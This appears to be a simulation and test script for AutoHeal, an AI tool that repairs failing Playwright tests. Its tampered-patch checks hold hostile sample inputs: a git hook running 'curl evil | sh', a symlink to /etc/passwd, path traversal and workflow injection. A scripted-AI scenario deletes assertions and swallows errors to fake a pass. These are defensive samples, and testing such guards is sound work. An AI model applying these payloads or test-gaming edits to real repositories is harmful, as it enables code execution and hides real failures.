#!/usr/bin/env node
/**
 * End-to-end simulation with dummy data. For each scenario it copies the
 * dummy shop (simulation/fixture) into simulation/work/<name>, makes it a git
 * repo, runs the Playwright suite to produce a real failed run, moves the
 * report and traces into autoheal-artifacts/ (as the GitHub workflow does),
 * runs `autoheal heal` and checks every outcome.
 *
 * Scenarios
 *   rules   no AI key: flaky → QUARANTINED, price change → APP_BUG,
 *           locator drift → UNFIXED (needs AI), nothing hidden
 *   ai      scripted AI: fixes the login test and the page object; proves
 *           both with the stability rerun; PR body, memory, final guard
 *   cheat   scripted AI that tries to delete an assertion and swallow errors
 *           → BLOCKED_CHEATING, files unchanged, exit code 3; then gives up
 *           on the profile test → APP_BUG
 *   comment comment mode: proposes fixes but leaves the tree clean
 *   action  runs the heal action, then the publish action in a fresh clone (fix PR,
 *           issues), checks re-runs, comment mode and refuses tampered patches
 *   dashboard  uploads the "ai" results to a local dashboard and reads them back
 *
 * Usage: npm run simulate [-- <scenario> ...]
 */

import { execFileSync, spawnSync } from 'node:child_process';
import { cpSync, existsSync, mkdirSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { fakeGh, runAction } from './action-harness.mjs';

const here = path.dirname(fileURLToPath(import.meta.url));
const repo = path.dirname(here);
const fixture = path.join(here, 'fixture');
const workRoot = path.join(here, 'work');
const cli = path.join(repo, 'dist', 'cli.js');

if (!existsSync(path.join(fixture, 'node_modules', '@playwright', 'test'))) {
  console.log('Installing the fixture’s Playwright…');
  execFileSync('npm', ['install', '--no-audit', '--no-fund'], { cwd: fixture, stdio: 'inherit' });
}

let failures = 0;
const check = (cond, label) => {
  console.log(`  ${cond ? '✔' : '✘'} ${label}`);
  if (!cond) failures++;
};

function prepare(name) {
  const dir = path.join(workRoot, name);
  rmSync(dir, { recursive: true, force: true });
  mkdirSync(dir, { recursive: true });
  cpSync(fixture, dir, { recursive: true, filter: (src) => !src.includes(`${path.sep}node_modules`) });
  symlinkSync(path.join(fixture, 'node_modules'), path.join(dir, 'node_modules'), 'dir');
  const git = (...args) => execFileSync('git', args, { cwd: dir, stdio: 'pipe' });
  git('init', '-q');
  git('add', '-A');
  git('-c', 'user.email=sim@example.com', '-c', 'user.name=sim', 'commit', '-qm', 'dummy shop');
  writeFileSync(path.join(dir, '.git', 'info', 'exclude'), 'autoheal-artifacts/\n.autoheal-out/\nscript.json\n');
  // The "CI run" that failed.
  spawnSync('npx', ['playwright', 'test'], { cwd: dir, stdio: 'pipe', env: { ...process.env, CI: '1' } });
  mkdirSync(path.join(dir, 'autoheal-artifacts'));
  for (const d of ['playwright-report', 'test-results']) cpSync(path.join(dir, d), path.join(dir, 'autoheal-artifacts', d), { recursive: true });
  rmSync(path.join(dir, 'playwright-report'), { recursive: true, force: true });
  rmSync(path.join(dir, 'test-results'), { recursive: true, force: true });
  rmSync(path.join(dir, '.flaky-marker'), { force: true }); // a fresh checkout, as on the heal runner
  return dir;
}

function heal(dir, args, env = {}) {
  const res = spawnSync(process.execPath, [cli, 'heal', '--report', 'autoheal-artifacts', '--max-failures', '4', ...args], {
    cwd: dir,
    encoding: 'utf8',
    env: { ...process.env, AUTOHEAL_PROVIDER: 'none', ANTHROPIC_API_KEY: '', OPENAI_API_KEY: '', ...env },
  });
  const summary = existsSync(path.join(dir, '.autoheal-out', 'summary.json')) ? JSON.parse(readFileSync(path.join(dir, '.autoheal-out', 'summary.json'), 'utf8')) : null;
  if (process.env.SIM_VERBOSE) console.log(res.stderr, res.stdout);
  return { code: res.status, stdout: res.stdout, stderr: res.stderr, summary };
}

const byTest = (summary, needle) => summary?.results.find((r) => r.failure.title.includes(needle));
const status = (dir) => execFileSync('git', ['status', '--porcelain'], { cwd: dir, encoding: 'utf8' }).trim();
const file = (dir, rel) => readFileSync(path.join(dir, rel), 'utf8');

function fixScript(login, po) {
  return [
    { text: 'Reading the test.', calls: [{ name: 'read_file', input: { path: 'tests/login.spec.ts' } }] },
    {
      calls: [
        {
          name: 'propose_fix',
          input: {
            path: 'tests/login.spec.ts',
            content: login.replace("name: 'Log in'", "name: 'Sign in'"),
            explanation: 'The submit button was renamed from "Log in" to "Sign in"; the trace shows only "Sign in".',
          },
        },
      ],
    },
    { calls: [{ name: 'read_file', input: { path: 'pages/profile.ts' } }] },
    {
      calls: [
        {
          name: 'propose_fix',
          input: {
            path: 'pages/profile.ts',
            content: po.replace("page.locator('#greeting')", "page.locator('#welcome-message')"),
            explanation: 'The greeting element was renamed to #welcome-message.',
          },
        },
      ],
    },
  ];
}

const scenarios = {
  rules() {
    const dir = prepare('rules');
    const { code, summary } = heal(dir, ['--mode', 'draft-pr']);
    check(code === 0, `exit code 0 (got ${code})`);
    check(summary?.totalFailures === 4, `4 failures read from the report (got ${summary?.totalFailures})`);
    check(byTest(summary, 'status badge')?.status === 'QUARANTINED', 'flaky test → QUARANTINED');
    check(byTest(summary, 'pro plan price')?.status === 'APP_BUG', 'price change → APP_BUG (test not touched)');
    check(byTest(summary, 'pro plan price')?.rootCause === 'REGRESSION', 'price change root cause REGRESSION');
    check(byTest(summary, 'user can log in')?.category === 'TEST_BUG', 'login → TEST_BUG');
    check(byTest(summary, 'user can log in')?.status === 'UNFIXED', 'login → UNFIXED without an AI key');
    check(byTest(summary, 'profile greets')?.rootCause === 'LOCATOR_DRIFT', 'profile → LOCATOR_DRIFT');
    check(file(dir, 'tests/pricing.spec.ts').includes("toHaveText('$10')"), 'pricing test unchanged');
    check(existsSync(path.join(dir, 'playwright-quarantine.json')), 'quarantine file written');
    const q = existsSync(path.join(dir, 'playwright-quarantine.json')) ? file(dir, 'playwright-quarantine.json') : '';
    check(/status badge/.test(q) && /expires|until|days/i.test(q), 'quarantine entry has the test and an expiry');
    check(summary?.changes === true && summary.changedFiles.includes('playwright-quarantine.json'), 'changes = quarantine file only');
    check(existsSync(path.join(dir, '.autoheal-out', 'issue-1.md')), 'issue body written for the app bug');
    check(summary?.spend.inputTokens === 0, 'no AI tokens used');
  },

  ai() {
    const dir = prepare('ai');
    const login = file(dir, 'tests/login.spec.ts');
    const po = file(dir, 'pages/profile.ts');
    const script = fixScript(login, po);
    writeFileSync(path.join(dir, 'script.json'), JSON.stringify(script));
    const requestLog = path.join(workRoot, 'ai-requests.log');
    writeFileSync(requestLog, '');
    const { code, summary } = heal(dir, ['--mode', 'draft-pr'], { AUTOHEAL_PROVIDER: 'scripted', AUTOHEAL_SCRIPT: path.join(dir, 'script.json'), AUTOHEAL_SCRIPT_LOG: requestLog, AUTOHEAL_PRICE_IN: '4', AUTOHEAL_PRICE_OUT: '20' });
    check(code === 0, `exit code 0 (got ${code})`);
    const l = byTest(summary, 'user can log in');
    const p = byTest(summary, 'profile greets');
    check(l?.status === 'FIXED' && l.fix?.by === 'ai', 'login → FIXED by the AI agent');
    check(l?.stability?.passed === true && l.stability.runs === 5, 'login fix passed 5 stability runs');
    check(l?.guard?.engine === 'PASS' && l.guard.local === 'PASS', 'login fix passed both anti-cheat scans');
    check(p?.status === 'FIXED' && p.fix?.file === 'pages/profile.ts', 'profile → FIXED in the page object');
    check(byTest(summary, 'pro plan price')?.status === 'APP_BUG', 'price change still APP_BUG');
    check(file(dir, 'tests/login.spec.ts').includes("name: 'Sign in'"), 'login file has the fix');
    check(file(dir, 'pages/profile.ts').includes('#welcome-message'), 'page object has the fix');
    const memFiles = existsSync(path.join(dir, '.autoheal', 'memory')) ? readdirSync(path.join(dir, '.autoheal', 'memory')) : [];
    check(memFiles.length === 2, `repo memory: one file per fix (got ${memFiles.length})`);
    const body = existsSync(path.join(dir, '.autoheal-out', 'pr-body.md')) ? file(dir, '.autoheal-out/pr-body.md') : '';
    check(/Stability proof/.test(body) && /Anti-cheat/.test(body) && /Sign in/.test(body), 'PR body has stability, anti-cheat and the diff');
    check(summary?.spend.inputTokens > 0 && summary.spend.usd > 0, `spend recorded ($${summary?.spend.usd})`);
    // Visual grounding: the agent's first request carried the trace's failure frame.
    const requests = readFileSync(requestLog, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l));
    const firstFix = requests.find((r) => r.tools > 0);
    check(firstFix?.images?.length === 1 && /image\/(png|jpeg)/.test(firstFix.images[0].mediaType) && firstFix.images[0].bytes > 1000, `the AI got the failure screenshot (${JSON.stringify(firstFix?.images)})`);
    check(Boolean(l?.failure?.screenshot) && /Visual grounding/.test(body), `PR body says the AI saw the page at the moment of failure (${l?.failure?.screenshot})`);
    const out = readFileSync(path.join(dir, '.autoheal-out', 'summary.json'), 'utf8') + body;
    check(!/[A-Za-z0-9+/]{2000}/.test(out), 'no image data in summary.json or the PR body');
    check(
      ['pages/profile.ts', 'playwright-quarantine.json', 'tests/login.spec.ts'].every((f) => summary?.changedFiles.includes(f)) &&
        summary.changedFiles.filter((f) => f.startsWith('.autoheal/memory/')).length === 2,
      `changed files listed (${summary?.changedFiles.join(', ')})`,
    );
    const rerun = spawnSync('npx', ['playwright', 'test', 'tests/login.spec.ts', 'tests/profile.spec.ts'], { cwd: dir, encoding: 'utf8' });
    check(rerun.status === 0, 'fixed tests pass in a fresh Playwright run');
    return { dir, summary };
  },

  cheat() {
    const dir = prepare('cheat');
    const login = file(dir, 'tests/login.spec.ts');
    const script = [
      {
        calls: [
          {
            name: 'propose_fix',
            input: {
              path: 'tests/login.spec.ts',
              content: login
                .replace("  await page.getByRole('button', { name: 'Log in' }).click();\n", '')
                .replace("  await expect(page.getByRole('status')).toHaveText('Signed in as ada@example.com');\n", ''),
              explanation: 'Remove the flaky steps.',
            },
          },
        ],
      },
      {
        calls: [
          {
            name: 'propose_fix',
            input: {
              path: 'tests/login.spec.ts',
              content: login.replace(
                "  await page.getByRole('button', { name: 'Log in' }).click();",
                "  try { await page.getByRole('button', { name: 'Log in' }).click({ timeout: 1000 }); } catch {}",
              ),
              explanation: 'Ignore the click error.',
            },
          },
        ],
      },
      { calls: [{ name: 'give_up', input: { reason: 'The page shows no greeting element at all; this looks like an app change.' } }] },
    ];
    writeFileSync(path.join(dir, 'script.json'), JSON.stringify(script));
    const before = file(dir, 'tests/login.spec.ts');
    const { code, summary } = heal(dir, ['--mode', 'draft-pr'], { AUTOHEAL_PROVIDER: 'scripted', AUTOHEAL_SCRIPT: path.join(dir, 'script.json') });
    check(code === 3, `exit code 3 for a blocked fix (got ${code})`);
    check(summary?.outcome === 'blocked', 'outcome blocked');
    const l = byTest(summary, 'user can log in');
    check(l?.status === 'BLOCKED_CHEATING', 'login → BLOCKED_CHEATING');
    check(l?.guard?.findings.some((f) => f.rule === 'assertion-removed' || f.rule === 'swallowed-error'), 'findings name the cheat');
    check(file(dir, 'tests/login.spec.ts') === before, 'login file unchanged on disk');
    check(byTest(summary, 'profile greets')?.status === 'APP_BUG', 'agent gave up on profile → APP_BUG');
  },

  comment() {
    const dir = prepare('comment');
    const login = file(dir, 'tests/login.spec.ts');
    writeFileSync(
      path.join(dir, 'script.json'),
      JSON.stringify([{ calls: [{ name: 'propose_fix', input: { path: 'tests/login.spec.ts', content: login.replace("name: 'Log in'", "name: 'Sign in'"), explanation: 'Button renamed.' } }] }, { calls: [{ name: 'give_up', input: { reason: 'skip' } }] }]),
    );
    const { code, summary } = heal(dir, ['--mode', 'comment', '--no-flaky-check'], { AUTOHEAL_PROVIDER: 'scripted', AUTOHEAL_SCRIPT: path.join(dir, 'script.json') });
    check(code === 0, `exit code 0 (got ${code})`);
    check(byTest(summary, 'user can log in')?.status === 'FIXED', 'fix proposed');
    check(summary?.changes === false, 'changes = false in comment mode');
    check(status(dir) === '', `working tree clean (got "${status(dir)}")`);
    check(existsSync(path.join(dir, '.autoheal-out', 'comment.md')) && file(dir, '.autoheal-out/comment.md').includes('Sign in'), 'comment has the proposed diff');
  },

  action() {
    const dir = prepare('action');
    execFileSync('git', ['branch', '-M', 'main'], { cwd: dir });
    const remote = path.join(workRoot, 'action-remote.git');
    rmSync(remote, { recursive: true, force: true });
    execFileSync('git', ['init', '-q', '--bare', remote]);
    execFileSync('git', ['remote', 'add', 'origin', remote], { cwd: dir });
    execFileSync('git', ['push', '-q', 'origin', 'main'], { cwd: dir, stdio: 'pipe' });
    const bin = path.join(workRoot, 'action-bin');
    const ghLog = path.join(workRoot, 'action-gh.log');
    rmSync(ghLog, { force: true });
    writeFileSync(ghLog, '');
    fakeGh(bin, ghLog);
    writeFileSync(path.join(dir, 'script.json'), JSON.stringify(fixScript(file(dir, 'tests/login.spec.ts'), file(dir, 'pages/profile.ts'))));
    writeFileSync(path.join(dir, '.git', 'info', 'exclude'), 'autoheal-artifacts/\n.autoheal-out/\nscript.json\n.runner-temp/\n');
    const github = {
      repository: 'acme/shop', run_id: '9', ref_name: 'main', sha: 'f'.repeat(40), actor: 'ada',
      event: { workflow_run: { id: 4242, html_url: 'https://github.com/acme/shop/actions/runs/4242', head_sha: 'a'.repeat(40), head_branch: 'main', actor: { login: 'ada' }, pull_requests: [] } },
    };
    const env = { PATH: `${bin}${path.delimiter}${process.env.PATH}`, AUTOHEAL_PROVIDER: 'scripted', AUTOHEAL_SCRIPT: path.join(dir, 'script.json'), ANTHROPIC_API_KEY: '', OPENAI_API_KEY: '' };
    const run = runAction({ actionDir: repo, projectDir: dir, inputs: { 'max-failures': '4' }, github, env, skip: ['Install AutoHeal AI'] });
    const steps = Object.fromEntries(run.log.map((s) => [s.step, s]));
    if (!run.ok || process.env.SIM_VERBOSE) for (const s of run.log) console.log(`    [${s.step}] ${s.skipped ? 'skipped' : `exit ${s.code}`}\n${s.stderr ?? ''}${s.stdout ?? ''}`);
    check(run.ok, 'heal job: every step succeeded');
    check(run.ctx.steps.heal?.outcome === 'fixed' && run.ctx.steps.heal?.fixed === '2', `heal outputs: outcome=${run.ctx.steps.heal?.outcome} fixed=${run.ctx.steps.heal?.fixed}`);
    check(readFileSync(ghLog, 'utf8') === '', 'heal job made no GitHub calls (read-only)');
    const result = run.ctx.steps.package?.['result-dir'];
    check(result && existsSync(path.join(result, 'patch.diff')) && existsSync(path.join(result, 'meta.json')), 'heal job packed a patch for the publish job');
    check(steps['Upload the result for the publish job']?.uses?.startsWith('actions/upload-artifact@'), 'result handed over as an artifact');
    const changedList = readFileSync(path.join(result, 'changed-files.txt'), 'utf8').trim().split('\n');
    check(changedList.includes('tests/login.spec.ts') && changedList.includes('pages/profile.ts'), `changed files listed (${changedList.length})`);

    // The publish job: a fresh checkout of the failed commit, no npm install.
    const publishDir = path.join(workRoot, 'action-publish');
    const freshClone = () => {
      rmSync(publishDir, { recursive: true, force: true });
      execFileSync('git', ['clone', '-q', '-b', 'main', remote, publishDir], { stdio: 'pipe' });
      writeFileSync(path.join(publishDir, '.git', 'info', 'exclude'), '.runner-temp/\n');
    };
    const publish = (inputs, resultDir = result) => {
      freshClone();
      return runAction({ actionDir: path.join(repo, 'publish'), projectDir: publishDir, inputs: { 'result-dir': resultDir, 'allowed-paths': 'tests/**, pages/**', 'base-branch': 'main', 'run-id': '4242', commit: 'a'.repeat(40), blocked: run.ctx.steps.heal.blocked, ...inputs }, github, env });
    };
    const pub = publish({});
    if (!pub.ok || process.env.SIM_VERBOSE) for (const s of pub.log) console.log(`    [publish ${s.step}] exit ${s.code}\n${s.stderr ?? ''}${s.stdout ?? ''}`);
    check(pub.ok, 'publish job succeeded');
    check(pub.ctx.steps.publish?.['pr-url'] === 'https://github.com/acme/shop/pull/101', 'fix PR opened');
    const calls = readFileSync(ghLog, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l));
    const create = calls.find((c) => c[0] === 'pr' && c[1] === 'create');
    check(create?.includes('--draft') && create[create.indexOf('--base') + 1] === 'main' && create[create.indexOf('--head') + 1] === 'autoheal/4242', 'draft PR from autoheal/4242 into main');
    const issue = calls.find((c) => c[0] === 'issue' && c[1] === 'create');
    check(issue && /AutoHeal/.test(issue[issue.indexOf('--title') + 1]) && /price/i.test(issue[issue.indexOf('--title') + 1]), `app bug issue opened (${issue?.[issue.indexOf('--title') + 1]})`);
    const pushed = execFileSync('git', ['--git-dir', remote, 'show', '--name-only', '--format=%s', 'autoheal/4242'], { encoding: 'utf8' });
    check(/AutoHeal fixes for failed run 4242/.test(pushed), 'fix commit pushed to the bot branch');
    const pushedFiles = pushed.trim().split('\n').slice(1).filter(Boolean).sort();
    const pushedCode = pushedFiles.filter((f) => !f.startsWith('.autoheal/memory/'));
    check(
      JSON.stringify(pushedCode) === JSON.stringify(['pages/profile.ts', 'playwright-quarantine.json', 'tests/login.spec.ts']) && pushedFiles.length === 5,
      `only healed files and their 2 memory entries committed (${pushedFiles.join(', ')})`,
    );
    const healedSpec = execFileSync('git', ['--git-dir', remote, 'show', 'autoheal/4242:tests/login.spec.ts'], { encoding: 'utf8' });
    check(healedSpec === file(dir, 'tests/login.spec.ts'), 'pushed spec matches what the heal job verified');
    const mainHead = execFileSync('git', ['--git-dir', remote, 'log', '-1', '--format=%s', 'main'], { encoding: 'utf8' }).trim();
    check(mainHead === 'dummy shop', 'base branch untouched');

    // Same run published again (a re-run): the PR is updated, not duplicated.
    const again = publish({});
    const calls2 = readFileSync(ghLog, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l));
    check(again.ok && calls2.filter((c) => c[0] === 'pr' && c[1] === 'create').length === 1 && calls2.some((c) => c[0] === 'pr' && c[1] === 'edit'), 're-run updates the existing PR');

    // A base that is itself an AutoHeal branch is refused (loop guard).
    const loop = publish({ 'base-branch': 'autoheal/1' });
    check(loop.ok && /Refusing/.test(loop.log[0]?.stdout ?? ''), 'PR against an autoheal/ branch refused');

    // Comment mode pushes nothing and comments on the commit.
    const before = readFileSync(ghLog, 'utf8').trim().split('\n').filter(Boolean).length;
    const comment = publish({ mode: 'comment' });
    const calls3 = readFileSync(ghLog, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l)).slice(before);
    check(comment.ok && calls3.length === 1 && calls3[0][0] === 'api' && /commits\/a{40}\/comments/.test(calls3[0][1]), 'comment mode only posts a comment');

    // A tampered result is refused before anything is applied or pushed.
    const evil = (name, patch) => {
      const d = path.join(workRoot, `action-evil-${name}`);
      rmSync(d, { recursive: true, force: true });
      cpSync(result, d, { recursive: true });
      writeFileSync(path.join(d, 'patch.diff'), patch);
      writeFileSync(path.join(d, 'changed-files.txt'), '');
      rmSync(path.join(d, 'changed-files.txt'));
      const branchesBefore = execFileSync('git', ['--git-dir', remote, 'branch', '--list', 'autoheal/666'], { encoding: 'utf8' });
      const res = publish({ 'run-id': '666' }, d);
      const branchesAfter = execFileSync('git', ['--git-dir', remote, 'branch', '--list', 'autoheal/666'], { encoding: 'utf8' });
      return { ok: res.ok, out: res.log[0]?.stdout ?? '', pushed: branchesAfter !== branchesBefore };
    };
    const newFile = (p, body) => `diff --git a/${p} b/${p}\nnew file mode 100644\nindex 0000000..1111111\n--- /dev/null\n+++ b/${p}\n@@ -0,0 +1 @@\n+${body}\n`;
    const cases = {
      workflow: newFile('.github/workflows/pwn.yml', 'on: push'),
      hook: newFile('.git/hooks/pre-commit', 'curl evil | sh'),
      traversal: newFile('tests/../../etc/x.ts', 'x'),
      newcode: newFile('tests/evil.spec.ts', 'require("child_process")'),
      config: `diff --git a/playwright.config.ts b/playwright.config.ts\nindex 1111111..2222222 100644\n--- a/playwright.config.ts\n+++ b/playwright.config.ts\n@@ -1 +1 @@\n-x\n+y\n`,
      symlink: `diff --git a/tests/link.ts b/tests/link.ts\nnew file mode 120000\nindex 0000000..1111111\n--- /dev/null\n+++ b/tests/link.ts\n@@ -0,0 +1 @@\n+/etc/passwd\n\\ No newline at end of file\n`,
      rename: `diff --git a/tests/login.spec.ts b/tests/x.spec.ts\nsimilarity index 100%\nrename from tests/login.spec.ts\nrename to tests/x.spec.ts\n`,
      mode: `diff --git a/tests/login.spec.ts b/tests/login.spec.ts\nold mode 100644\nnew mode 100755\n`,
    };
    for (const [name, patch] of Object.entries(cases)) {
      const r = evil(name, patch);
      check(!r.ok && !r.pushed && /publish refused/.test(r.out), `tampered patch refused: ${name}`);
    }
  },

  async dashboard(aiResult) {
    const result = aiResult ?? scenarios.ai();
    const { spawn } = await import('node:child_process');
    const dbDir = path.join(workRoot, 'dashboard');
    rmSync(dbDir, { recursive: true, force: true });
    mkdirSync(dbDir, { recursive: true });
    const secret = 'sim-secret-0123456789-abcdefghijklmnop';
    const port = 4399;
    const server = spawn(process.execPath, [cli, 'dashboard', '--port', String(port), '--host', '127.0.0.1', '--db', path.join(dbDir, 'a.db')], {
      env: { ...process.env, AUTOHEAL_DASHBOARD_SECRET: secret, AUTOHEAL_DASHBOARD_VIEW_TOKEN: 'view-token-1234567890' },
      stdio: 'pipe',
    });
    try {
      for (let i = 0; i < 50; i++) {
        try {
          if ((await fetch(`http://127.0.0.1:${port}/healthz`)).ok) break;
        } catch {}
        await new Promise((r) => setTimeout(r, 100));
      }
      const up = spawnSync(process.execPath, [cli, 'upload', '--summary', path.join(result.dir, '.autoheal-out', 'summary.json'), '--pr-url', 'https://github.com/acme/shop/pull/7'], {
        encoding: 'utf8',
        env: { ...process.env, AUTOHEAL_DASHBOARD_URL: `http://127.0.0.1:${port}`, AUTOHEAL_DASHBOARD_SECRET: secret },
      });
      check(up.status === 0 && /HTTP 200/.test(up.stderr), `signed upload accepted (${up.stderr.trim()})`);
      const bad = await fetch(`http://127.0.0.1:${port}/api/heal`, { method: 'POST', body: '{"version":1,"events":[]}', headers: { 'x-autoheal-signature': 'sha256=00', 'x-autoheal-timestamp': String(Math.floor(Date.now() / 1000)) } });
      check(bad.status === 401, `unsigned upload rejected (HTTP ${bad.status})`);
      const noView = await fetch(`http://127.0.0.1:${port}/api/stats`);
      check(noView.status === 401, 'stats need the view token');
      const stats = await (await fetch(`http://127.0.0.1:${port}/api/stats`, { headers: { authorization: 'Bearer view-token-1234567890' } })).json();
      check(stats.stats.fixed === 2 && stats.stats.fixPrs === 1 && stats.stats.appBugs === 1 && stats.stats.quarantined === 1, `stats: ${JSON.stringify(stats.stats)}`);
      const page = await (await fetch(`http://127.0.0.1:${port}/`, { headers: { authorization: 'Bearer view-token-1234567890' } })).text();
      check(page.includes('AutoHeal Dashboard') && page.includes('LOCATOR_DRIFT') && page.includes('pull/7'), 'dashboard page lists the results');
    } finally {
      server.kill();
    }
  },
};

const wanted = process.argv.slice(2);
const order = wanted.length ? wanted : ['rules', 'ai', 'cheat', 'comment', 'action', 'dashboard'];
let aiResult;
for (const name of order) {
  if (!scenarios[name]) {
    console.error(`Unknown scenario ${name}`);
    process.exit(2);
  }
  console.log(`\n▶ ${name}`);
  const started = Date.now();
  const out = name === 'dashboard' ? await scenarios.dashboard(aiResult) : scenarios[name]();
  if (name === 'ai') aiResult = out;
  console.log(`  (${((Date.now() - started) / 1000).toFixed(0)}s)`);
}
console.log(failures ? `\n${failures} check(s) failed` : '\nAll simulation checks passed');
process.exit(failures ? 1 : 0);
